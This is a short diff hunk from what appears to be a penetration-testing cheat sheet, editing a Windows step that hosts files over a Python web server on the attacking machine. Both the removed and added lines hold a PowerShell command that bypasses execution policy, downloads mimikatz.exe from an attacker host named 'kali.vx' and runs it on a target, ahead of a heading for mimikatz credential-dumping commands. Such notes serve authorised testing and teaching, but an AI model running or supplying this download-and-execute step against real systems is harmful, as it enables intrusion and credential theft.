@@ -105,7 +105,9 @@ sudo python3 -m http.server 80 &> /dev/null &
 - Run: `Start-Process`
 
 ```console
-powershell.exe -NoProfile -ExecutionPolicy Bypass (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/mimikatz.exe', $env:APPDATA + '\mimikatz.exe'); Start-Process $env:APPDATA\mimikatz.exe
+set SRC_URL=http://kali.vx/mimikatz.exe
+set DST_PATH=%USERPROFILE%\mimikatz.exe
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile($env:SRC_URL,$env:DST_PATH); Start-Process $env:DST_PATH
 ```
 
 **On Target:** mimikatz commands
